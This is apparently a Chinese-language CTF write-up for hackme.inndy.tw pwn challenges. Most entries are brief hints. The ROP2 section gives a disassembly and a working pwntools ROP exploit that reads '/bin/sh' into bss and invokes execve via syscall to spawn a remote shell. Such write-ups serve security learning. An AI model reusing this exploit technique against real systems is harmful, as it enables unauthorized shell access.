---
title: Writeup::hackme.inndy.tw
date: 2021-10-17 21:12:04
tags: pwn
---

## catflag
用pwntools 送出指令，不要用ncat
## homework
仔細觀察組語，可以發現return address的對應index

利用OOB直接就可以解

## toooomuch
猜數字遊戲，隨便一個二分搜就有答案
<!-- more -->
## toooomuch2
簡單的ROP，先利用 fgets()把shellcode吃到bss之後跳上去

## ROP
利用ROPGadget 就串得出來，也可以用 pop rdi 優化chain

## ROP2
### 保護機制
NX, Partial RELRO
### 程式邏輯
#### main
```asm
┌ 146: int main (int32_t arg_4h);
│           ; var int32_t var_33h @ ebp-0x33
│           ; var int32_t var_2fh @ ebp-0x2f
│           ; var int32_t var_2bh @ ebp-0x2b
│           ; var int32_t var_27h @ ebp-0x27
│           ; var int32_t var_23h @ ebp-0x23
│           ; var int32_t var_1fh @ ebp-0x1f
│           ; var int32_t var_1bh @ ebp-0x1b
│           ; var int32_t var_17h @ ebp-0x17
│           ; var int32_t var_13h @ ebp-0x13
│           ; var int32_t var_fh @ ebp-0xf
│           ; var int32_t var_bh @ ebp-0xb
│           ; var int32_t var_9h @ ebp-0x9
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg int32_t arg_4h @ esp+0x54
│           0x08048487      8d4c2404       lea ecx, dword [arg_4h]
│           0x0804848b      83e4f0         and esp, 0xfffffff0
│           0x0804848e      ff71fc         push dword [ecx - 4]
│           0x08048491      55             push ebp
│           0x08048492      89e5           mov ebp, esp
│           0x08048494      51             push ecx
│           0x08048495      83ec34         sub esp, 0x34
│           0x08048498      83ec0c         sub esp, 0xc
│           0x0804849b      6a1e           push 0x1e                   ; 30
│           0x0804849d      e85efeffff     call sym.imp.alarm
│           0x080484a2      83c410         add esp, 0x10
│           0x080484a5      c745cd43616e.  mov dword [var_33h], 0x206e6143 ; 'Can '
│           0x080484ac      c745d1796f75.  mov dword [var_2fh], 0x20756f79 ; 'you '
│           0x080484b3      c745d5736f6c.  mov dword [var_2bh], 0x766c6f73 ; 'solv'
│           0x080484ba      c745d9652074.  mov dword [var_27h], 0x68742065 ; 'e th'
│           0x080484c1      c745dd69733f.  mov dword [var_23h], 0xa3f7369
│           0x080484c8      c745e1476976.  mov dword [var_1fh], 0x65766947 ; 'Give'
│           0x080484cf      c745e5206d65.  mov dword [var_1bh], 0x20656d20 ; ' me '
│           0x080484d6      c745e9796f75.  mov dword [var_17h], 0x72756f79 ; 'your'
│           0x080484dd      c745ed20726f.  mov dword [var_13h], 0x706f7220 ; ' rop'
│           0x080484e4      c745f1636861.  mov dword [var_fh], 0x69616863 ; 'chai'
│           0x080484eb      66c745f56e3a   mov word [var_bh], 0x3a6e   ; 'n:'
│           0x080484f1      c645f700       mov byte [var_9h], 0
│           0x080484f5      6a2a           push 0x2a                   ; '*' ; 42
│           0x080484f7      8d45cd         lea eax, dword [var_33h]
│           0x080484fa      50             push eax
│           0x080484fb      6a01           push 1                      ; 1
│           0x080484fd      6a04           push 4                      ; 4
│           0x080484ff      e81cfeffff     call sym.imp.syscall
│           0x08048504      83c410         add esp, 0x10
│           0x08048507      e848ffffff     call sym.overflow
│           0x0804850c      b800000000     mov eax, 0
│           0x08048511      8b4dfc         mov ecx, dword [var_4h]
│           0x08048514      c9             leave
│           0x08048515      8d61fc         lea esp, dword [ecx - 4]
└           0x08048518      c3             ret
```
跟上一題是差不多的邏輯，但多了`syscall()`

也可以在`overflow()`找到漏洞

### 利用方式
由於有`syscall`, 可以構造任意system call, 而且因為是x86, 所以不用找pop gadget

在binary中找不到`/bin/sh`, 所以可以先構造syscall把`/bin/sh`讀到記憶體中, 再想辦法getshell
#### exploit:
```python
#!/usr/bin/env python2

from pwn import *
import pwnlib.elf

p = remote('hackme.inndy.tw', 7703)
e = ELF('./rop2')

payload = 'A' * 16 + p32(e.symbols['syscall']) + p32(e.symbols['overflow']) + p32(3) + p32(0)
payload += p32(e.bss()) + p32(8) # syscall(3, 0, Bss, 8)

p.sendline(payload)
p.send('/bin/sh\x00')

payload = 'A' * 16 + p32(e.symbols['syscall']) + p32(e.symbols['overflow']) + p32(0xb) + p32(e.bss())
payload += p32(0) + p32(0) # syscall(0xb, '/bin/sh', 0, 0)
p.sendline(payload)

p.interactive()
p.close()
```
### echo
用`fmtstr_payload()`把 `printf()` 改成 `system()`
讓程式接著跑，她就會自己跑到`printf(“/bin/sh”)` 了
### smashthestack
有開canary，但是仍可以利用 `__stack_chk_fail` 印出在記憶體中的flag

構造長一點的payload，一路蓋到 `__libc_argv[0]` 就好

